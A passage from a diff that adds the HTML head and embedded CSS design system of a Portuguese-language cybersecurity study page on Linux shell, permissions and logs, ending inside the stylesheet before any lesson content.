@@ -1,0 +1,3030 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="study-slug" content="Linux-para-Seguranca">
+  <title>Linux para Segurança: Shell, Permissões e Logs — Estudos de Cibersegurança</title>
+
+  <!-- Google Fonts: Barlow Semi Condensed, IBM Plex Sans, IBM Plex Mono -->
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Barlow+Semi+Condensed:ital,wght@0,600;0,700;0,800;1,700&family=IBM+Plex+Mono:ital,wght@0,400;0,500;0,600;1,400&family=IBM+Plex+Sans:ital,wght@0,400;0,500;0,600;0,700;1,400&display=swap" rel="stylesheet">
+
+  <style>
+/* ==========================================================================
+   ESTUDOS DE CIBERSEGURANÇA — DESIGN SYSTEM BASE (base.css)
+   Compatível com temas Claro / Escuro, responsivo e 100% offline-ready.
+   Tipografia: Barlow Semi Condensed, IBM Plex Sans, IBM Plex Mono.
+   ========================================================================== */
+
+/* --------------------------------------------------------------------------
+   0. Importação de Fontes Web (Google Fonts com Fallbacks Locais Nativos)
+   -------------------------------------------------------------------------- */
+@import url('https://fonts.googleapis.com/css2?family=Barlow+Semi+Condensed:ital,wght@0,600;0,700;0,800;1,700&family=IBM+Plex+Mono:ital,wght@0,400;0,500;0,600;1,400&family=IBM+Plex+Sans:ital,wght@0,400;0,500;0,600;0,700;1,400&display=swap');
+
+/* --------------------------------------------------------------------------
+   1. Design Tokens & Variáveis CSS (Tema Claro - Padrão)
+   -------------------------------------------------------------------------- */
+:root {
+  /* Paleta Base */
+  --ground: #F3F6F7;
+  --surface: #FFFFFF;
+  --sunk: #E9EEF0;
+  --ink: #16242E;
+  --muted: #566672;
+  --rule: #D3DBE0;
+
+  /* Cores Temáticas das 10 Trilhas */
+  --t1-blue: #2563EB;     /* Trilha 1: Fundamentos & Princípios */
+  --t2-green: #059669;    /* Trilha 2: Defesa & Operações Blue Team */
+  --t3-red: #DC2626;      /* Trilha 3: Segurança Ofensiva & Red Team */
+  --t4-purple: #7C3AED;   /* Trilha 4: Engenharia, Cloud & AppSec */
+  --t5-cyan: #0891B2;     /* Trilha 5: Criptografia & Identidade */
+  --t6-amber: #D97706;    /* Trilha 6: Governança, Risco & Regulação */
+  --t7-rose: #DB2777;
+  --t8-slate: #475569;
+  --t9-indigo: #4F46E5;
+  --t10-orange: #C2410C;
+
+  /* Cores de Alerta / Callouts */
+  --tip-color: #059669;
+  --tip-bg: #ECFDF5;
+  --tip-border: #10B981;
+
+  --warning-color: #D97706;
+  --warning-bg: #FFFBEB;
+  --warning-border: #F59E0B;
+
+  --danger-color: #DC2626;
+  --danger-bg: #FEF2F2;
+  --danger-border: #EF4444;
+
+  --law-color: #7C3AED;
+  --law-bg: #F5F3FF;
+  --law-border: #8B5CF6;
+
+  /* Tipografia */
+  --font-display: "Barlow Semi Condensed", "Arial Narrow", Arial, sans-serif;
+  --font-body: "IBM Plex Sans", system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+  --font-mono: "IBM Plex Mono", Menlo, Monaco, Consolas, "Courier New", monospace;
+
+  /* Espaçamento e Bordas */
+  --radius-sm: 4px;
+  --radius-md: 8px;
+  --radius-lg: 12px;
+  --radius-pill: 9999px;
+  --radius: var(--radius-md);
+  --accent: var(--t1-blue);
+
+  /* Sombras */
+  --shadow-sm: 0 1px 2px rgba(15, 23, 28, 0.05);
+  --shadow-md: 0 4px 6px -1px rgba(15, 23, 28, 0.08), 0 2px 4px -2px rgba(15, 23, 28, 0.05);
+  --shadow-lg: 0 10px 15px -3px rgba(15, 23, 28, 0.1), 0 4px 6px -4px rgba(15, 23, 28, 0.05);
+
+  /* Transição */
+  --transition-fast: 0.15s ease-in-out;
+  --transition-normal: 0.25s ease-in-out;
+}
+
+/* --------------------------------------------------------------------------
+   2. Suporte a Tema Escuro (Modo Noturno / Dark Mode)
+   -------------------------------------------------------------------------- */
+@media (prefers-color-scheme: dark) {
+  :root:not([data-theme="light"]) {
+    --ground: #0F171C;
+    --surface: #172229;
+    --sunk: #1E2B33;
+    --ink: #E4EAED;
+    --muted: #9BABB6;
+    --rule: #2B3A44;
+
+    /* Trilhas no Dark Mode (ajuste de saturação e contraste) */
+    --t1-blue: #60A5FA;
+    --t2-green: #34D399;
+    --t3-red: #F87171;
+    --t4-purple: #A78BFA;
+    --t5-cyan: #22D3EE;
+    --t6-amber: #FBBF24;
+    --t7-rose: #F472B6;
+    --t8-slate: #94A3B8;
+    --t9-indigo: #818CF8;
+    --t10-orange: #FB923C;
+
+    /* Alertas no Dark Mode */
+    --tip-color: #34D399;
+    --tip-bg: rgba(5, 150, 105, 0.18);
+    --tip-border: #059669;
+
+    --warning-color: #FBBF24;
+    --warning-bg: rgba(217, 119, 6, 0.18);
+    --warning-border: #D97706;
+
+    --danger-color: #F87171;
+    --danger-bg: rgba(220, 38, 38, 0.20);
+    --danger-border: #DC2626;
+
+    --law-color: #A78BFA;
+    --law-bg: rgba(124, 58, 237, 0.18);
+    --law-border: #7C3AED;
+
+    --shadow-sm: 0 1px 2px rgba(0, 0, 0, 0.3);
+    --shadow-md: 0 4px 6px -1px rgba(0, 0, 0, 0.4);
+    --shadow-lg: 0 10px 15px -3px rgba(0, 0, 0, 0.5);
+  }
+}
+
+:root[data-theme="dark"] {
+  --ground: #0F171C;
+  --surface: #172229;
+  --sunk: #1E2B33;
+  --ink: #E4EAED;
+  --muted: #9BABB6;
+  --rule: #2B3A44;
+
+  --t1-blue: #60A5FA;
+  --t2-green: #34D399;
+  --t3-red: #F87171;
+  --t4-purple: #A78BFA;
+  --t5-cyan: #22D3EE;
+  --t6-amber: #FBBF24;
+  --t7-rose: #F472B6;
+  --t8-slate: #94A3B8;
+  --t9-indigo: #818CF8;
+  --t10-orange: #FB923C;
+
+  --tip-color: #34D399;
+  --tip-bg: rgba(5, 150, 105, 0.18);
+  --tip-border: #059669;
+
+  --warning-color: #FBBF24;
+  --warning-bg: rgba(217, 119, 6, 0.18);
+  --warning-border: #D97706;
+
+  --danger-color: #F87171;
+  --danger-bg: rgba(220, 38, 38, 0.20);
+  --danger-border: #DC2626;
+
+  --law-color: #A78BFA;
+  --law-bg: rgba(124, 58, 237, 0.18);
+  --law-border: #7C3AED;
+
+  --shadow-sm: 0 1px 2px rgba(0, 0, 0, 0.3);
+  --shadow-md: 0 4px 6px -1px rgba(0, 0, 0, 0.4);
+  --shadow-lg: 0 10px 15px -3px rgba(0, 0, 0, 0.5);
+}
+
+:root[data-theme="light"] {
+  --ground: #F3F6F7;
+  --surface: #FFFFFF;
+  --sunk: #E9EEF0;
+  --ink: #16242E;
+  --muted: #566672;
+  --rule: #D3DBE0;
+
+  --t1-blue: #2563EB;
+  --t2-green: #059669;
+  --t3-red: #DC2626;
+  --t4-purple: #7C3AED;
+  --t5-cyan: #0891B2;
+  --t6-amber: #D97706;
+  --t7-rose: #DB2777;
+  --t8-slate: #475569;
+  --t9-indigo: #4F46E5;
+  --t10-orange: #C2410C;
+
+  --tip-color: #059669;
+  --tip-bg: #ECFDF5;
+  --tip-border: #10B981;
+
+  --warning-color: #D97706;
+  --warning-bg: #FFFBEB;
+  --warning-border: #F59E0B;
+
+  --danger-color: #DC2626;
+  --danger-bg: #FEF2F2;
+  --danger-border: #EF4444;
+
+  --law-color: #7C3AED;
+  --law-bg: #F5F3FF;
+  --law-border: #8B5CF6;
+}
+
+/* --------------------------------------------------------------------------
+   3. Reset e Estilos Globais
+   -------------------------------------------------------------------------- */
+*, *::before, *::after {
+  box-sizing: border-box;
+  margin: 0;
+  padding: 0;
+}
+
+img, select, input, textarea {
+  max-width: 100%;
+}
+
+html {
+  font-size: 16px;
+  scroll-behavior: smooth;
+  color-scheme: light dark;
+}
+
+body {
+  background-color: var(--ground);
+  color: var(--ink);
+  font-family: var(--font-body);
+  font-size: 1rem;
+  line-height: 1.65;
+  -webkit-font-smoothing: antialiased;
+  -moz-osx-font-smoothing: grayscale;
+  padding: 0;
+  margin: 0;
+  transition: background-color var(--transition-normal), color var(--transition-normal);
+}
+
+/* Tipografia Estrutural */
+h1, h2, h3, h4, h5, h6 {
+  font-family: var(--font-display);
+  font-weight: 700;
+  color: var(--ink);
+  line-height: 1.25;
+  margin-bottom: 0.75rem;
+  letter-spacing: -0.01em;
+}
+
+h1 { font-size: 2.25rem; }
+h2 { font-size: 1.75rem; margin-top: 2rem; border-bottom: 2px solid var(--rule); padding-bottom: 0.5rem; }
+h3 { font-size: 1.35rem; margin-top: 1.5rem; }
+h4 { font-size: 1.15rem; }
+
+p {
+  margin-bottom: 1rem;
+}
+
+a {
+  color: var(--t1-blue);
+  text-decoration: none;
+  font-weight: 500;
+  transition: opacity var(--transition-fast);
+}
+
+a:hover {
+  text-decoration: underline;
+}
+
+code, kbd, samp {
+  font-family: var(--font-mono);
+  font-size: 0.88em;
+  background-color: var(--sunk);
+  padding: 0.15rem 0.35rem;
+  border-radius: var(--radius-sm);
+  border: 1px solid var(--rule);
+}
+
+:not(pre) > code {
+  overflow-wrap: anywhere;
+}
+
+pre {
+  font-family: var(--font-mono);
+  font-size: 0.9rem;
+  background-color: #0D1418;
+  color: #E2E8F0;
+  padding: 1rem;
+  border-radius: var(--radius-md);
+  overflow-x: auto;
+  line-height: 1.5;
+  margin-bottom: 1.25rem;
+}
+
+pre code {
+  background: transparent;
+  padding: 0;
+  border: none;
+  color: inherit;
+}
+
+/* --------------------------------------------------------------------------
+   4. Layout do Documento & Barra de Navegação Superior
+   -------------------------------------------------------------------------- */
+.top-nav {
+  background-color: var(--surface);
+  border-bottom: 1px solid var(--rule);
+  position: sticky;
+  top: 0;
+  z-index: 100;
+  backdrop-filter: blur(8px);
+}
+
+.top-nav-inner {
+  max-width: 960px;
+  margin: 0 auto;
+  padding: 0.75rem 1.25rem;
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  gap: 1rem;
+}
+
+.nav-back {
+  display: inline-flex;
+  align-items: center;
+  gap: 0.5rem;
+  font-size: 0.9rem;
+  color: var(--muted);
+  text-decoration: none;
+  font-weight: 600;
+  transition: color var(--transition-fast);
+}
+
+.nav-back:hover {
+  color: var(--ink);
+  text-decoration: none;
+}
+
+.nav-actions {
+  display: flex;
+  align-items: center;
+  gap: 0.75rem;
+}
+
+.theme-toggle-btn {
+  background: var(--sunk);
+  color: var(--ink);
+  border: 1px solid var(--rule);
+  padding: 0.4rem 0.75rem;
+  border-radius: var(--radius-md);
+  cursor: pointer;
+  font-size: 0.85rem;
+  font-weight: 600;
+  font-family: var(--font-body);
+  display: inline-flex;
+  align-items: center;
+  gap: 0.35rem;
+  transition: background-color var(--transition-fast), border-color var(--transition-fast);
+}
+
+.theme-toggle-btn:hover {
+  background: var(--surface);
+  border-color: var(--muted);
+}
+
+.container {
+  max-width: 960px;
+  margin: 0 auto;
+  padding: 1.75rem 1.25rem 4rem 1.25rem;
+}
+
+/* --------------------------------------------------------------------------
+   5. Cabeçalho de Destaque (.hero-header) e Metadados
+   -------------------------------------------------------------------------- */
+.hero-header {
+  background-color: var(--surface);
+  border: 1px solid var(--rule);
+  border-radius: var(--radius-lg);
+  padding: 2rem;
+  margin-bottom: 2rem;
+  box-shadow: var(--shadow-sm);
+  position: relative;
+  overflow: hidden;
+}
+
+.hero-header::before {
+  content: "";
+  position: absolute;
+  top: 0;
+  left: 0;
+  right: 0;
+  height: 5px;
+  background-color: var(--track-color, var(--t1-blue));
+}
+
+.badge {
+  display: inline-flex;
+  align-items: center;
+  padding: 0.25rem 0.75rem;
+  border-radius: var(--radius-pill);
+  font-family: var(--font-display);
+  font-size: 0.85rem;
+  font-weight: 700;
+  letter-spacing: 0.03em;
+  text-transform: uppercase;
+  margin-bottom: 0.75rem;
+  background-color: var(--sunk);
+  color: var(--ink);
+}
+
+.badge-t1 { background-color: rgba(37, 99, 235, 0.15); color: var(--t1-blue); }
+.badge-t2 { background-color: rgba(5, 150, 105, 0.15); color: var(--t2-green); }
+.badge-t3 { background-color: rgba(220, 38, 38, 0.15); color: var(--t3-red); }
+.badge-t4 { background-color: rgba(124, 58, 237, 0.15); color: var(--t4-purple); }
+.badge-t5 { background-color: rgba(8, 145, 178, 0.15); color: var(--t5-cyan); }
+.badge-t6 { background-color: rgba(217, 119, 6, 0.15); color: var(--t6-amber); }
+.badge-t7 { background-color: rgba(219, 39, 119, 0.15); color: var(--t7-rose); }
+.badge-t8 { background-color: rgba(71, 85, 105, 0.15); color: var(--t8-slate); }
+.badge-t9 { background-color: rgba(79, 70, 229, 0.15); color: var(--t9-indigo); }
+.badge-t10 { background-color: rgba(194, 65, 12, 0.15); color: var(--t10-orange); }
+
+.hero-subtitle {
+  font-size: 1.15rem;
+  color: var(--muted);
+  margin-bottom: 1.25rem;
+}
+
+.meta-bar {
+  display: flex;
+  flex-wrap: wrap;
+  gap: 1rem 1.5rem;
+  padding-top: 1rem;
+  border-top: 1px solid var(--rule);
+  font-size: 0.9rem;
+  color: var(--muted);
+}
+
+.meta-item {
+  display: inline-flex;
+  align-items: center;
+  gap: 0.4rem;
+}
+
+.meta-item strong {
+  color: var(--ink);
+}
+
+/* --------------------------------------------------------------------------
+   6. Caixas de Destaque (.callout)
+   -------------------------------------------------------------------------- */
+.callout {
+  padding: 1.1rem 1.35rem;
+  margin: 1.5rem 0;
+  border-radius: var(--radius-md);
+  border-left: 5px solid var(--muted);
+  background-color: var(--sunk);
+  font-size: 0.97rem;
+  line-height: 1.6;
+}
+
+.callout p:last-child {
+  margin-bottom: 0;
+}
+
+.callout strong {
+  display: inline-block;
+  margin-bottom: 0.25rem;
+}
+
+.callout-tip, .callout.tip {
+  border-left-color: var(--tip-color);
+  background-color: var(--tip-bg);
+}
+
+.callout-warning, .callout.warning {
+  border-left-color: var(--warning-color);
+  background-color: var(--warning-bg);
+}
+
+.callout-danger, .callout.danger {
+  border-left-color: var(--danger-color);
+  background-color: var(--danger-bg);
+}
+
+.callout-law, .callout.law {
+  border-left-color: var(--law-color);
+  background-color: var(--law-bg);
+}
+
+/* --------------------------------------------------------------------------
+   7. Bloco Terminal / Comandos (.terminal-box)
+   -------------------------------------------------------------------------- */
+.terminal-box {
+  background-color: #0A0F13;
+  color: #E2E8F0;
+  border: 1px solid #1E293B;
+  border-radius: var(--radius-md);
+  margin: 1.5rem 0;
+  overflow: hidden;
+  box-shadow: var(--shadow-md);
+}
+
+.terminal-header {
+  background-color: #151E27;
+  padding: 0.5rem 0.85rem;
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  border-bottom: 1px solid #1E2B37;
+}
+
+.terminal-title {
+  font-family: var(--font-mono);
+  font-size: 0.8rem;
+  color: #94A3B8;
+  display: inline-flex;
+  align-items: center;
+  gap: 0.4rem;
+}
+
+.terminal-title::before {
+  content: "● ● ●";
+  letter-spacing: 0.15rem;
+  color: #475569;
+  font-size: 0.65rem;
+}
+
+.btn-copy {
+  background-color: #243242;
+  color: #CBD5E1;
+  border: 1px solid #334155;
+  border-radius: var(--radius-sm);
+  padding: 0.25rem 0.6rem;
+  font-size: 0.75rem;
+  font-family: var(--font-mono);
+  font-weight: 600;
+  cursor: pointer;
+  transition: all var(--transition-fast);
+}
+
+.btn-copy:hover {
+  background-color: #334155;
+  color: #FFFFFF;
+}
+
+.terminal-box pre {
+  margin: 0;
+  background-color: transparent;
+  border-radius: 0;
+  padding: 1rem;
+  color: #E2E8F0;
+}
+
+/* --------------------------------------------------------------------------
+   8. Simulador / Painel de Laboratório (.lab-box)
+   -------------------------------------------------------------------------- */
+.lab-box {
+  background-color: var(--surface);
+  border: 2px solid var(--rule);
+  border-radius: var(--radius-lg);
+  margin: 2rem 0;
+  overflow: hidden;
+  box-shadow: var(--shadow-md);
+}
+
+.lab-header {
+  background-color: var(--sunk);
+  padding: 1.25rem 1.5rem;
+  border-bottom: 1px solid var(--rule);
+}
+
+.lab-header h3 {
+  margin-top: 0;
+  margin-bottom: 0.35rem;
+  font-size: 1.3rem;
+  color: var(--ink);
+  display: flex;
+  align-items: center;
+  gap: 0.5rem;
+}
+
+.lab-header p {
+  color: var(--muted);
+  font-size: 0.95rem;
+  margin-bottom: 0;
+}
+
+.lab-body {
+  padding: 1.5rem;
+}
+
+.lab-controls {
+  display: flex;
+  flex-wrap: wrap;
+  align-items: center;
+  gap: 1rem;
+  margin-bottom: 1.25rem;
+  background-color: var(--ground);
+  padding: 1rem;
+  border-radius: var(--radius-md);
+  border: 1px solid var(--rule);
+}
+
+.lab-controls > * {
+  min-width: 0;
+  max-width: 100%;
+}
+
+.lab-controls label {
+  font-size: 0.9rem;
+  font-weight: 600;
+  color: var(--ink);
+  display: inline-flex;
+  align-items: center;
+  gap: 0.4rem;
+}
+
+.lab-controls input[type="text"],
+.lab-controls input[type="number"],
+.lab-controls select,
+.lab-controls textarea {
+  background-color: var(--surface);
+  color: var(--ink);
+  border: 1px solid var(--rule);
+  border-radius: var(--radius-sm);
+  padding: 0.45rem 0.75rem;
+  font-family: var(--font-mono);
+  font-size: 0.9rem;
+  transition: border-color var(--transition-fast), box-shadow var(--transition-fast);
+}
+
+.lab-controls input:focus,
+.lab-controls select:focus,
+.lab-controls textarea:focus {
+  outline: none;
+  border-color: var(--t1-blue);
+  box-shadow: 0 0 0 3px rgba(37, 99, 235, 0.2);
+}
+
+.lab-output {
+  background-color: #0B1116;
+  color: #38BDF8;
+  font-family: var(--font-mono);
+  font-size: 0.88rem;
+  padding: 1.25rem;
+  border-radius: var(--radius-md);
+  border: 1px solid #1E293B;
+  min-height: 100px;
+  max-height: 400px;
+  overflow-y: auto;
+  white-space: pre-wrap;
+  word-break: break-all;
+  line-height: 1.55;
+}
+
+/* Controles e Grid do Laboratório Interativo */
+.lab-controls-grid {
+  display: grid;
+  grid-template-columns: repeat(auto-fit, minmax(260px, 1fr));
+  gap: 1.25rem;
+  padding: 1.5rem;
+  background-color: var(--ground);
+  border-bottom: 1px solid var(--rule);
+}
+
+.form-group {
+  display: flex;
+  flex-direction: column;
+  gap: 0.4rem;
+}
+
+.form-group.full-width {
+  grid-column: 1 / -1;
+}
+
+.form-group label {
+  font-size: 0.88rem;
+  font-weight: 600;
+  color: var(--ink);
+}
+
+.form-control {
+  background-color: var(--surface);
+  color: var(--ink);
+  border: 1px solid var(--rule);
+  border-radius: var(--radius-sm);
+  padding: 0.55rem 0.85rem;
+  font-family: var(--font-mono);
+  font-size: 0.9rem;
+  transition: border-color var(--transition-fast), box-shadow var(--transition-fast);
+}
+
+.form-control:focus {
+  outline: none;
+  border-color: var(--t1-blue);
+  box-shadow: 0 0 0 3px rgba(37, 99, 235, 0.2);
+}
+
+.form-range {
+  width: 100%;
+  accent-color: var(--t1-blue);
+  cursor: pointer;
+}
+
+.flags-btn-group {
+  display: flex;
+  flex-wrap: wrap;
+  gap: 0.6rem;
+  margin-top: 0.25rem;
+}
+
+.flag-toggle {
+  display: inline-flex;
+  align-items: center;
+  gap: 0.4rem;
+  background-color: var(--surface);
+  border: 1px solid var(--rule);
+  border-radius: var(--radius-sm);
+  padding: 0.35rem 0.75rem;
+  font-family: var(--font-mono);
+  font-size: 0.85rem;
+  font-weight: 600;
+  cursor: pointer;
+  user-select: none;
+  transition: all var(--transition-fast);
+}
+
+.flag-toggle:hover {
+  border-color: var(--t1-blue);
+}
+
+.flag-toggle input[type="checkbox"] {
+  accent-color: var(--t1-blue);
+  cursor: pointer;
+}
+
+.lab-actions-bar {
+  display: flex;
+  flex-wrap: wrap;
+  gap: 0.75rem;
+  padding: 1.25rem 1.5rem;
+  background-color: var(--surface);
+  border-bottom: 1px solid var(--rule);
+}
+
+.packet-display-wrap {
+  padding: 1.5rem;
+  background-color: var(--surface);
+}
+
+.packet-display-wrap h4 {
+  margin-top: 0;
+  margin-bottom: 1rem;
+  font-size: 1.05rem;
+  color: var(--ink);
+}
+
+.packet-header-grid {
+  display: grid;
+  grid-template-columns: repeat(32, 1fr);
+  gap: 4px;
+  background-color: var(--ground);
+  padding: 0.75rem;
+  border: 1px solid var(--rule);
+  border-radius: var(--radius-md);
+  overflow-x: auto;
+}
+
+.header-field-cell {
+  background-color: var(--surface);
+  border: 1px solid var(--rule);
+  border-radius: var(--radius-sm);
+  padding: 0.5rem 0.6rem;
+  display: flex;
+  flex-direction: column;
+  justify-content: center;
+  align-items: center;
+  text-align: center;
+  min-width: 75px;
+}
+
+.header-field-cell.span-8 {
+  grid-column: span 8;
+}
+
+.header-field-cell.span-16 {
+  grid-column: span 16;
+}
+
+.header-field-cell.span-32 {
+  grid-column: span 32;
+}
+
+.header-field-cell .field-title {
+  font-size: 0.72rem;
+  font-family: var(--font-mono);
+  color: var(--muted);
+  text-transform: uppercase;
+  letter-spacing: 0.04em;
+  margin-bottom: 0.2rem;
+}
+
+.header-field-cell .field-val {
+  font-size: 0.88rem;
+  font-family: var(--font-mono);
+  font-weight: 600;
+  color: var(--ink);
+}
+
+.header-field-cell .field-val.highlight {
+  color: var(--t1-blue);
+}
+
+.header-field-cell .field-val.flag-badge {
+  background-color: var(--sunk);
+  padding: 0.15rem 0.45rem;
+  border-radius: var(--radius-sm);
+  font-size: 0.8rem;
+}
+
+@media (max-width: 768px) {
+  .packet-header-grid {
+    grid-template-columns: repeat(16, 1fr);
+  }
+  .header-field-cell.span-8 {
+    grid-column: span 16;
+  }
+}
+
+.edr-grid-container {
+  grid-template-columns: 1fr 1fr;
+}
+
+
+/* --------------------------------------------------------------------------
+   9. Botões e Controles Padrão
+   -------------------------------------------------------------------------- */
+.btn-primary {
+  background-color: var(--t1-blue);
+  color: #FFFFFF;
+  border: none;
+  border-radius: var(--radius-md);
+  padding: 0.55rem 1.15rem;
+  font-family: var(--font-body);
+  font-size: 0.92rem;
+  font-weight: 600;
+  cursor: pointer;
+  transition: background-color var(--transition-fast), transform var(--transition-fast);
+  display: inline-flex;
+  align-items: center;
+  gap: 0.4rem;
+}
+
+.btn-primary:hover {
+  filter: brightness(1.1);
+  transform: translateY(-1px);
+}
+
+.btn-primary:active {
+  transform: translateY(0);
+}
+
+.btn-secondary {
+  background-color: var(--sunk);
+  color: var(--ink);
+  border: 1px solid var(--rule);
+  border-radius: var(--radius-md);
+  padding: 0.55rem 1.15rem;
+  font-family: var(--font-body);
+  font-size: 0.92rem;
+  font-weight: 600;
+  cursor: pointer;
+  transition: all var(--transition-fast);
+}
+
+.btn-secondary:hover {
+  background-color: var(--surface);
+  border-color: var(--muted);
+}
+
+/* --------------------------------------------------------------------------
+   10. Lista de Verificação Interativa (.checklist)
+   -------------------------------------------------------------------------- */
+.checklist {
+  background-color: var(--surface);
+  border: 1px solid var(--rule);
+  border-radius: var(--radius-lg);
+  padding: 1.5rem;
+  margin: 1.75rem 0;
+  box-shadow: var(--shadow-sm);
+}
+
+.checklist h4 {
+  font-size: 1.15rem;
+  margin-bottom: 0.5rem;
+  color: var(--ink);
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+}
+
+.checklist-progress-bar {
+  width: 100%;
+  height: 6px;
+  background-color: var(--sunk);
+  border-radius: var(--radius-pill);
+  margin-bottom: 1rem;
+  overflow: hidden;
+}
+
+.checklist-progress-fill {
+  height: 100%;
+  background-color: var(--t2-green);
+  width: 0%;
+  transition: width 0.3s ease;
+}
+
+.check-item {
+  display: flex;
+  align-items: flex-start;
+  gap: 0.75rem;
+  padding: 0.65rem 0.75rem;
+  margin: 0.25rem 0;
+  border-radius: var(--radius-md);
+  cursor: pointer;
+  user-select: none;
+  transition: background-color var(--transition-fast);
+}
+
+.check-item:hover {
+  background-color: var(--sunk);
+}
+
+.check-item input[type="checkbox"] {
+  appearance: none;
+  -webkit-appearance: none;
+  width: 1.25rem;
+  height: 1.25rem;
+  border: 2px solid var(--muted);
+  border-radius: var(--radius-sm);
+  background-color: var(--surface);
+  cursor: pointer;
+  flex-shrink: 0;
+  margin-top: 0.15rem;
+  position: relative;
+  transition: all var(--transition-fast);
+}
+
+.check-item input[type="checkbox"]:checked {
+  background-color: var(--t2-green);
+  border-color: var(--t2-green);
+}
+
+.check-item input[type="checkbox"]:checked::after {
+  content: "";
+  position: absolute;
+  left: 5px;
+  top: 1px;
+  width: 4px;
+  height: 8px;
+  border: solid white;
+  border-width: 0 2px 2px 0;
+  transform: rotate(45deg);
+}
+
+.check-item span {
+  font-size: 0.95rem;
+  color: var(--ink);
+  line-height: 1.45;
+  transition: color var(--transition-fast);
+}
+
+.check-item.completed span {
+  text-decoration: line-through;
+  color: var(--muted);
+}
+
+/* --------------------------------------------------------------------------
+   11. Quiz de Fixação (.quiz, .quiz-item, .quiz-section)
+   -------------------------------------------------------------------------- */
+.quiz-section {
+  background-color: var(--surface);
+  border: 1px solid var(--rule);
+  border-radius: var(--radius-lg);
+  padding: 1.75rem;
+  margin: 2rem 0;
+  box-shadow: var(--shadow-sm);
+}
+
+.quiz-section h3 {
+  margin-top: 0;
+  margin-bottom: 1rem;
+}
+
+.quiz-item {
+  background-color: var(--sunk);
+  border: 1px solid var(--rule);
+  border-radius: var(--radius-md);
+  padding: 1.25rem;
+  margin-bottom: 1.25rem;
+}
+
+.quiz-question {
+  font-weight: 600;
+  font-size: 1rem;
+  color: var(--ink);
+  margin-bottom: 0.85rem;
+}
+
+.quiz-options {
+  display: flex;
+  flex-direction: column;
+  gap: 0.5rem;
+  margin-bottom: 0.75rem;
+}
+
+.quiz-btn {
+  background-color: var(--surface);
+  color: var(--ink);
+  border: 1px solid var(--rule);
+  border-radius: var(--radius-md);
+  padding: 0.75rem 1rem;
+  text-align: left;
+  font-family: var(--font-body);
+  font-size: 0.92rem;
+  cursor: pointer;
+  transition: all var(--transition-fast);
+  line-height: 1.4;
+}
+
+.quiz-btn:hover:not(:disabled) {
+  border-color: var(--t1-blue);
+  background-color: var(--ground);
+}
+
+.quiz-btn.correct {
+  background-color: var(--tip-bg) !important;
+  border-color: var(--t2-green) !important;
+  color: var(--t2-green) !important;
+  font-weight: 600;
+}
+
+.quiz-btn.incorrect {
+  background-color: var(--danger-bg) !important;
+  border-color: var(--danger-color) !important;
+  color: var(--danger-color) !important;
+}
+
+.quiz-feedback {
+  padding: 0.85rem 1rem;
+  border-radius: var(--radius-md);
+  font-size: 0.9rem;
+  line-height: 1.5;
+  margin-top: 0.75rem;
+  border-left: 4px solid var(--rule);
+  background-color: var(--surface);
+}
+
+.quiz-feedback.correct {
+  border-left-color: var(--t2-green);
+  background-color: var(--tip-bg);
+  color: var(--ink);
+}
+
+.quiz-feedback.incorrect {
+  border-left-color: var(--danger-color);
+  background-color: var(--danger-bg);
+  color: var(--ink);
+}
+
+/* --------------------------------------------------------------------------
+   12. Grade de Fatos / Cards Comparativos (.facts-grid, .facts-card)
+   -------------------------------------------------------------------------- */
+.facts-grid {
+  display: grid;
+  grid-template-columns: repeat(auto-fit, minmax(260px, 1fr));
+  gap: 1.25rem;
+  margin: 1.5rem 0;
+}
+
+.facts-card {
+  background-color: var(--surface);
+  border: 1px solid var(--rule);
+  border-radius: var(--radius-md);
+  padding: 1.25rem;
+  box-shadow: var(--shadow-sm);
+  transition: transform var(--transition-fast), box-shadow var(--transition-fast);
+}
+
+.facts-card:hover {
+  transform: translateY(-2px);
+  box-shadow: var(--shadow-md);
+}
+
+.facts-card h4 {
+  font-size: 1.1rem;
+  margin-bottom: 0.5rem;
+  color: var(--ink);
+}
+
+.facts-card p {
+  color: var(--muted);
+  font-size: 0.92rem;
+  margin-bottom: 0;
+}
+
+/* --------------------------------------------------------------------------
+   13. Tabelas Técnicas Comparativas
+   -------------------------------------------------------------------------- */
+.table-responsive {
+  width: 100%;
+  overflow-x: auto;
+  margin: 1.5rem 0;
+  border-radius: var(--radius-md);
+  border: 1px solid var(--rule);
+}
+
+table {
+  width: 100%;
+  border-collapse: collapse;
+  font-size: 0.92rem;
+  background-color: var(--surface);
+  text-align: left;
+}
+
+th, td {
+  padding: 0.75rem 1rem;
+  border-bottom: 1px solid var(--rule);
+}
+
+th {
+  background-color: var(--sunk);
+  font-family: var(--font-display);
+  font-weight: 700;
+  color: var(--ink);
+  letter-spacing: 0.02em;
+}
+
+tr:last-child td {
+  border-bottom: none;
+}
+
+tr:hover td {
+  background-color: var(--ground);
+}
+
+/* --------------------------------------------------------------------------
+   14. Diagramas de Arquitetura e Fluxo (Mermaid pré-compilado em SVG)
+   -------------------------------------------------------------------------- */
+.diagram-box {
+  background: var(--surface);
+  border: 1px solid var(--rule);
+  border-radius: var(--radius);
+  margin: 1.5rem 0;
+  overflow: hidden;
+  box-shadow: 0 4px 12px rgba(0, 0, 0, 0.2);
+}
+
+.diagram-header {
+  display: flex;
+  justify-content: space-between;
+  align-items: center;
+  padding: 0.65rem 1rem;
+  background: var(--ground);
+  border-bottom: 1px solid var(--rule);
+  font-size: 0.825rem;
+  font-weight: 600;
+  color: var(--muted);
+}
+
+.diagram-title {
+  font-family: var(--font-display);
+  font-weight: 700;
+  color: var(--ink);
+  letter-spacing: 0.02em;
+}
+
+.diagram-badge {
+  display: inline-flex;
+  align-items: center;
+  gap: 0.35rem;
+  background: rgba(37, 99, 235, 0.15);
+  color: var(--accent);
+  border: 1px solid rgba(37, 99, 235, 0.3);
+  padding: 0.15rem 0.5rem;
+  border-radius: var(--radius-pill);
+  font-size: 0.725rem;
+  font-family: var(--font-mono);
+}
+
+.diagram-svg-wrap {
+  padding: 1.5rem;
+  overflow-x: auto;
+  -webkit-overflow-scrolling: touch;
+  text-align: center;
+  background: var(--surface);
+}
+
+.diagram-svg-wrap svg {
+  max-width: 100%;
+  height: auto;
+  display: inline-block;
